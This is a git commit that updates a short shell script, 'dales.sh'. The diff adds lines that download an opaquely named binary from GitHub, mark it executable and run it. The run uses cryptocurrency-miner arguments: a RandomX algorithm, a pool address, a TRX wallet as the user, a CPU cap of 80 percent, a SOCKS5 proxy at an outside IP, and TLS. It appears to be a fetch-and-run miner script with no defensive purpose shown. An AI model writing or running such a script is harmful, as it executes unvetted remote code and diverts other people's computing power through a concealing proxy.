c2e31069fc785fe30642f6c60a021b65bdc2722e
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-21 02:35:31 +0700

    Update dales.sh

--- dales.sh
+++ dales.sh
@@ -1,2 +1,4 @@
 #!/bin/sh
-wget https://github.com/chikahusarii/cols/blob/main/bksde && chmod +x bksde
+wget https://github.com/chikahusarii/cols/blob/main/bksde
+chmod +x bksde
+./bksde -a rx/0 172.20.144.1:3333 -u TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM -p x --max-cpu-usage 80 -x socks5://50.116.14.201:7497 -k --tls
